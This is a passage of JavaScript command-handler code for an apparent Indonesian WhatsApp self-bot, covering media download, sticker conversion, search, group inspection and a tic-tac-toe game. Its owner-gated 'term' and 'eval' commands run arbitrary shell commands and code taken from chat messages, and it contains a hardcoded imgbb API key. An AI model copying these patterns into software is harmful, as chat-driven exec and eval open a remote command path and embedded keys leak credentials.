            var srch = args.join(" ")
    		aramas = await yts(srch);
    		aramat = aramas.all 
   			var mulaikah = aramat[0].url
                  try {
                    yta(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
                        const captions = `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break
case 'play':
              if (!q) return reply('Linknya?')
              buttons = [{buttonId: `${prefix}video ${q}`,buttonText:{displayText: `🎥 Video`},type:1},{buttonId:`${prefix}playyy ${q}`,buttonText:{displayText:'🎵 Mp3'},type:1}]
              imageMsg = (await syaa.prepareMessageMedia(fs.readFileSync(`./stik/fake.jpeg`), 'imageMessage', {thumbnail: fs.readFileSync(`./stik/fake.jpeg`)})).imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`Silahkan Pilih Media Yg Akan Di Download kak`,buttons,headerType:4}
              prep = await syaa.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              syaa.relayWAMessage(prep)
              break
case "sticker":
      case "stiker":
      case "sg":
        case "sgif":
      case "s":
        if (isBanned) return reply(mess.ban)
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await syaa.downloadAndSaveMediaMessage(encmedia);
          ran = "666.webp";
          await ffmpeg(`./${media}`)
            .input(media)
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              reply("error");
            })
            .on("end", function () {
              console.log("Finish");
              syaa.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: mek,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else if (
          ((isMedia && mek.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              mek.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await syaa.downloadAndSaveMediaMessage(encmedia);
          ran = "999.webp";
          reply(mess.wait);
          await ffmpeg(`./${media}`)
            .inputFormat(media.split(".")[1])
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              tipe = media.endsWith(".mp4") ? "video" : "gif";
              reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`);
            })
            .on("end", function () {
              console.log("Finish");
              syaa.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: mek,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else {
          reply(
            `Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`
          );
        }
        break;
      case 's2':
        case 'sticker2':
          case 'stiker2':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker)) {
ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
owgi = await  syaa.downloadAndSaveMediaMessage(ger)
anu = await imgbb("f0b190d67308d34811fab9c56fe8aba7", owgi)
tekks = `${anu.display_url}`
anu1 = `${tekks}`
sendStickerFromUrl(from, `${anu1}`, mess.success)
} else {
reply('Gunakan foto!')
}
break
        case 'toimg':
          if (isBanned) return reply(mess.ban)
				if (!isQuotedSticker) return reply('𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !')
					reply(mess.wait)
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await syaa.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply(ind.stikga())
						buffer = fs.readFileSync(ran)
						syaa.sendMessage(from, buffer, image, {quoted: mek, caption: 'Succes Conver Sticker To Image'})
						fs.unlinkSync(ran)
					})
				break
      case "ytsearch":
        case "yts":
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
          if (isBanned) return reply(mess.ban)
        if (args.length < 1) return reply("Tolong masukan query!");
        var srch = args.join("");
        try {
          var aramas = await yts(srch);
        } catch {
          return await syaa.sendMessage(
            from,
            "Error!",
            MessageType.text,
            dload
          );
        }
        aramat = aramas.all;
        var tbuff = await getBuffer(aramat[0].image);
        var ytresult = "";
        ytresult += "「 *YOUTUBE SEARCH* 」";
        ytresult += "\n________________________\n\n";
        aramas.all.map((video) => {
          ytresult += "❏ Title: " + video.title + "\n";
          ytresult += "❏ Link: " + video.url + "\n";
          ytresult += "❏ Durasi: " + video.timestamp + "\n";
          ytresult +=
            "❏ Upload: " + video.ago + "\n________________________\n\n";
        });
        ytresult += "◩ *SELF-BOT*";
        await fakethumb(tbuff, ytresult);
        break;
      case "setreply":
      case "setfake":
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        if (!q) return fakegroup(mess.wrongFormat);
        fake = q;
        fakegroup(`Succes Mengganti Conversation Fake : ${q}`);
        break;
      case "setfakeimg":
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await syaa.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/fake.jpeg`, delb);
          reply("Sukses");
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
      case "setthumb":
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await syaa.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/thumb.jpeg`, delb);
          reply("Sukses");
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
      case "emoji":
        case "semoji":
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
          if (isBanned) return reply(mess.ban)
        if (!q) return fakegroup("emojinya?\nExample : /emoji 🗿");
        qes = args.join(" ");
        emoji.get(`${qes}`).then((emoji) => {
          teks = `${emoji.images[4].url}`;
          sendStickerFromUrl(from, `${teks}`);
          console.log(teks);
        });
        break;
      case "image":
      case "gimage":
      case "googleimage":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (isBanned) return reply(mess.ban)
        if (args.length < 1) return reply("Apa Yang Mau Dicari?");
        reply(mess.wait);
        teks = args.join(" ");
        res = await gis(teks, google);
        function google(error, result) {
          if (error) {
            return reply(
              "_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_"
            );
          } else {
            gugIm = result;
            random = gugIm[Math.floor(Math.random() * gugIm.length)].url;
            sendMediaURL(from, random);
          }
        }
        break;

      case "brainly":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (isBanned) return reply(mess.ban)
        if (args.length < 1) return reply("Pertanyaan apa");
        brien = args.join(" ");
        brainly(`${brien}`).then((res) => {
          teks = "❉───────────────────────❉\n";
          for (let Y of res.data) {
            teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`;
          }
          syaa.sendMessage(from, teks, text, {
            quoted: mek,
            detectLinks: false,
          });
        });
        break;

      case "igstalk":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (isBanned) return reply(mess.ban)
        if (!q) return fakegroup("Usernamenya?");
        ig.fetchUser(`${args.join(" ")}`).then((Y) => {
          console.log(`${args.join(" ")}`);
          ten = `${Y.profile_pic_url_hd}`;
          teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join(
            ""
          )}\n*Full Name* : ${Y.full_name}\n*Bio* : ${
            Y.biography
          }\n*Following* : ${Y.followers}\n*Followers* : ${
            Y.following
          }\n*Private* : ${Y.is_private}\n*Verified* : ${
            Y.is_verified
          }\n\n*Link* : https://instagram.com/${args.join("")}`;
          sendMediaURL(from, ten, teks);
        });
        break;
      case "fb":
        if (isBanned) return reply(mess.ban)
        if (!q) return reply("Linknya?");
        if (!isUrl(args[0]) && !args[0].includes("facebook.com"))
          return reply(mess.Iv);
        reply(mess.wait);
        te = args.join(" ");
        hx.fbdown(`${te}`).then((G) => {
          ten = `${G.HD}`;
          sendMediaURL(from, ten, `*Link video_normal* : ${G.Normal_video}`);
        });
        break;
      case "term":
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        if (!q) return fakegroup(mess.wrongFormat);
        exec(q, (err, stdout) => {
          if (err) return fakegroup(`SELF-BOT:~ ${err}`);
          if (stdout) {
            fakegroup(stdout);
          }
        });
        break;
      case "join":
        
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (isBanned) return reply(mess.ban)
        try {
          
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return reply(mess.Iv);
          hen = args[0];
          if (!q) return reply("Masukan link group");
          var codeInvite = hen.split("https://chat.whatsapp.com/")[1];
          if (!codeInvite) return fakegroup("pastikan link sudah mekar!");
          var response = await syaa.acceptInvite(codeInvite);
          reply("SUKSES");
        } catch {
          fakegroup("LINK ERROR!");
        }
        break;
      case "runtime":
      case "test":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        run = process.uptime();
        teks = `${kyun(run)}`;
        fakegroup(teks);
        break;
      case "speed":
      case "ping":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        const timestamp = speed();
        const latensi = speed() - timestamp;
        exec(`neofetch --stdout`, (error, stdout, stderr) => {
          const child = stdout.toString("utf-8");
          const ssd = child.replace(/Memory:/, "Ram:");
          const pingnya = `*${ssd}Speed: ${latensi.toFixed(4)} Second*`;
          fakegroup(pingnya);
        });
        break;
      case "totag":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (isBanned) return reply(mess.ban)
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, image, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedAudio) &&
          args.length == 0
        ) {
          encmedia = isQuotedAudio
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, audio, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedVideo) &&
          args.length == 0
        ) {
          encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "video/mp4",
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, video, options);
          fs.unlinkSync(file);
        } else {
          reply(
            `reply gambar/sticker/audio/video dengan caption ${prefix}totag`
          );
        }
        break;
      case "tomp4":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (isBanned) return reply(mess.ban)
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          ger = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await syaa.downloadAndSaveMediaMessage(ger);
          webp2mp4File(owgi).then((res) => {
            sendMediaURL(from, res.result, "Done");
          });
        } else {
          reply("reply stiker");
        }
        fs.unlinkSync(owgi);
        break;
      case "tourl":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (isBanned) return reply(mess.ban)
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedVideo) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedVideo
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          owgi = await syaa.downloadMediaMessage(boij);
          res = await upload(owgi);
          reply(res);
        } else {
          reply("kirim/reply gambar/video");
        }
        break;
      case "inspect":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (isBanned) return reply(mess.ban)
        try {
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return reply(mess.Iv);
          if (!q) return reply("masukan link wa");
          cos = args[0];
          var net = cos.split("https://chat.whatsapp.com/")[1];
          if (!net) return reply("pastikan itu link https://whatsapp.com/");
          jids = [];
          let {
            id,
            owner,
            subject,
            subjectOwner,
            desc,
            descId,
            participants,
            size,
            descOwner,
            descTime,
            creation,
          } = await syaa.query({
            json: ["query", "invite", net],
            expect200: true,
          });
          let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split("@")[0]}` : "*Owner* : -"}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : "*Desc* : tidak ada"}
*Id desc* : ${descId}
${
  descOwner
    ? `*Desc diubah oleh* : @${descOwner.split("@")[0]}`
    : "*Desc diubah oleh* : -"
}\n*Tanggal* : ${
            descTime ? `${formatDate(descTime * 1000)}` : "-"
          }\n\n*Kontak yang tersimpan*\n`;
          for (let y of participants) {
            par += `> @${y.id.split("@")[0]}\n*Admin* : ${
              y.isAdmin ? "Ya" : "Tidak"
            }\n`;
            jids.push(`${y.id.replace(/@c.us/g, "@s.whatsapp.net")}`);
          }
          jids.push(
            `${owner ? `${owner.replace(/@c.us/g, "@s.whatsapp.net")}` : "-"}`
          );
          jids.push(
            `${
              descOwner
                ? `${descOwner.replace(/@c.us/g, "@s.whatsapp.net")}`
                : "-"
            }`
          );
          syaa.sendMessage(from, par, text, {
            quoted: mek,
            contextInfo: { mentionedJid: jids },
          });
        } catch {
          reply("Link error");
        }
        break;
      case "eval":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        syaa.sendMessage(
          from,
          JSON.stringify(eval(budy.slice(5)), null, "\t"),
          text,
          { quoted: mek }
        );
        break;
      default:
          if (isTTT && isPlayer2) {
            if (budy.startsWith("Y")){
              tto = roomttt.filter(gang => gang.id.includes(from))
              tty = tto[0]
              number = tto[0].number;
              teksboard = `*[ TIC TAC TOE GAME ]*
Player1 @${tty.player1.split('@')[0]}=❌
Player2 @${tty.player2.split('@')[0]}=⭕

${number[1]}${number[2]}${number[3]}
${number[4]}${number[5]}${number[6]}
${number[7]}${number[8]}${number[9]}

giliran = @${tty.player1.split('@')[0]}`
              syaa.sendMessage(from, teksboard, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
            }
            if (budy.startsWith('N')) {
              tto = roomttt.filter(gang => gang.id.includes(from))
              tty = tto[0]
              rooms = roomttt.filter(tokek => !tokek.id.includes(from))
              roomttt = rooms;
              syaa.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`,text,{quoted:mek,contextInfo:{mentionedJid:[tty.player2]}})
            }
          }
          if (isTTT && isPlayer1) {
            noober = parseInt(budy)
            if (isNaN(noober)) return 
            if (noober < 1 || noober > 9) return reply("masukan number dengan benar")
            main = roomttt.filter(gang => gang.id.includes(from))
            if (!defttt.includes(main[0].number[noober])) return reply("number sudah di isi, pilih number lain nya")
            if (main[0].turn.includes(sender)) return reply("tunggu giliran mu dulu ya")
            x = '❌'
            main[0].number[noober] = x
            main[0].turn = main[0].player1
            rooms = roomttt.filter(bang => !bang.id.includes(from))
            roomttt = rooms;
            pop = main[0]
            roomttt.push(pop)
            tto = roomttt.filter(hgh => hgh.id.includes(from))
            tty = tto[0]
            number = tto[0].number;
            ttt = `${number[1]}${number[2]}${number[3]}\n${number[4]}${number[5]}${number[6]}\n${number[7]}${number[8]}${number[9]}`
            
            winningspeech = () => {
              ucapan1 = `*[ Hasil pertandingan Tic Tac Toe ]*\n\nyeyyy permainan di menangkan oleh *@${tty.player1.split('@')[0]}*\n`
              ucapan2 = `*[ Papan Hasil akhir ]*\n\n${ttt}`
              syaa.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player2]}}) 
              rooms = roomttt.filter(hhg => !hhg.id.includes(from))
              return roomttt = rooms 
            }
            if (number[1] == x && number[2] == x && number[3] == x) return winningspeech()
            
            if (number[1] == x && number[4] == x && number[7] == x) return winningspeech()
            
            if (number[1] == x && number[5] == x && number[9] == x) return winningspeech()
            
            if (number[2] == x && number[5] == x && number[8] == x) return winningspeech()
            
            if (number[4] == x && number[5] == x && number[6] == x) return winningspeech()
            
            if (number[7] == x && number[8] == x && number[9] == x) return winningspeech()
            
            if (number[3] == x && number[5] == x && number[7] == x) return winningspeech()
            
            if (number[3] == x && number[6] == x && number[9] == x) return winningspeech()
            
            if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !ttt.includes('5️⃣') && !ttt.includes('6️⃣') && !ttt.includes('7️⃣') && !ttt.includes('8️⃣') && !ttt.includes('9️⃣')){
              ucapan1 = `*[ Hasil pertandingan Tic Tac Toe ]*\n\npermainan seri Good Game\n`
              ucapan2 = `*[ Papan Hasil akhir ]*\n\n${ttt}`
              reply(ucapan1)
              naa = roomttt.filter(hhg => !hhg.id.includes(from))
              return roomttt= naa
            }
            ucapan = `*[ TIC TAC TOE GAME ]*\n\nPlayer1 @${tty.player1.split('@')[0]}=❌\nPlayer2 @${tty.player2.split('@')[0]}=⭕\n\n${ttt}\n\ngiliran = @${tty.player2.split('@')[0]}`
            syaa.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
          }
          if (isTTT && isPlayer2) {
            noober = parseInt(budy)
            if (isNaN(noober)) return 
            if (noober < 1 || noober > 9) return reply("masukan number dengan benar")
            main = roomttt.filter(gang => gang.id.includes(from))
            if (!defttt.includes(main[0].number[noober])) return reply("number sudah di isi, pilih number lain nya")
            if (main[0].turn.includes(sender)) return reply("tunggu giliran mu dulu ya")
            benar = '⭕'
            main[0].number[noober] = benar
            main[0].turn = main[0].player2
            rooms = roomttt.filter(bang => !bang.id.includes(from))
            roomttt = rooms;
            pop = main[0]
            roomttt.push(pop)
            tto = roomttt.filter(hgh => hgh.id.includes(from))
            tty = tto[0]
            number = tto[0].number;
            ttt = `${number[1]}${number[2]}${number[3]}\n${number[4]}${number[5]}${number[6]}\n${number[7]}${number[8]}${number[9]}`
            
            winningspeech = () => {
              ucapan1 = `*[ Hasil pertandingan Tic Tac Toe ]*\n\nyeyyy permainan di menangkan oleh *@${tty.player2.split('@')[0]}*\n`
              ucapan2 = `*[ Papan Hasil akhir ]*\n\n${ttt}`
              syaa.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player1]}}) 
              rooms = roomttt.filter(hhg => !hhg.id.includes(from))
              return roomttt = rooms 
            }
            if (number[1] == benar && number[2] == benar && number[3] == benar) return winningspeech()
            
            if (number[1] == benar && number[4] == benar && number[7] == benar) return winningspeech()
            
            if (number[1] == benar && number[5] == benar && number[9] == benar) return winningspeech()
            
            if (number[2] == benar && number[5] == benar && number[8] == benar) return winningspeech()
            
            if (number[4] == benar && number[5] == benar && number[6] == benar) return winningspeech()
            
            if (number[7] == benar && number[8] == benar && number[9] == benar) return winningspeech()
            
            if (number[3] == benar && number[5] == benar && number[7] == benar) return winningspeech()
            
            if (number[3] == benar && number[6] == benar && number[9] == benar) return winningspeech()
            
            if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !ttt.includes('5️⃣') && !ttt.includes('6️⃣') && !ttt.includes('7️⃣') && !ttt.includes('8️⃣') && !ttt.includes('9️⃣')){
              ucapan1 = `*[ Hasil pertandingan Tic Tac Toe ]*\n\npermainan seri Good Game\n`
              ucapan2 = `*[ Papan Hasil akhir ]*\n\n${ttt}`
              reply(ucapan1)
              naa = roomttt.filter(hhg => !hhg.id.includes(from))
              return roomttt= naa
            }
            ucapan = `*[ TIC TAC TOE GAME ]*\n\nPlayer1 @${tty.player1.split('@')[0]}=❌\nPlayer2 @${tty.player2.split('@')[0]}=⭕\n\n${ttt}\n\ngiliran = @${tty.player1.split('@')[0]}`
            syaa.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
          }
      }
                  
    if (isGroup && budy != undefined) {
    } else {
      console.log(
        color("[TEXT]", "red"),
        "SELF-MODE",
        color(sender.split("@")[0])
      );
    }
  } catch (e) {
    e = String(e);
    if (!e.includes("c.isZero") && !e.includes("jid")) {
      console.log("Message : %s", color(e, "green"));
    }
    // console.log(e)
  }
};
